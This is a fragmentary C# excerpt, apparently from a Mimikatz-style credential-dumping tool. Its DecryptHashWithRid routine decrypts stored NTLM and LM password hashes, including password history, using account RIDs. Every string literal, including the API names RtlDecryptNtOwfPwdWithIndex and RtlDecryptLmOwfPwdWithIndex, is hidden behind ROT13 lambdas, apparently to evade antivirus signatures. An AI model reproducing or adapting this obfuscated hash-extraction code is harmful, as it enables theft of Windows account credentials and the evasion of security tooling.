                    DecryptHashWithRid(cypheredHashBuffer.Buffer, cypheredHashBuffer.Length, rid, isNtlm ? (isHistory ? new string("agyz".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) : new string("AGYZ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) : (isHistory ? new string("yz  ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) : new string("YZ  ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())), isHistory);
                if (cypheredHashBuffer.Buffer != IntPtr.Zero)
        ...
        private static bool DecryptHashWithRid(IntPtr encodedData, uint encodedDataSize, uint rid, string prefix, bool isHistory)
        {
            ...
            for (int i = 0; i < encodedDataSize; i += Msv1.LM_NTLM_HASH_LENGTH)
            {
                ...
                else Console.Write(new string("EgyQrpelcgAgBjsCjqJvguVaqrk/EgyQrpelcgYzBjsCjqJvguVaqrk".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            }
            return status;
        }
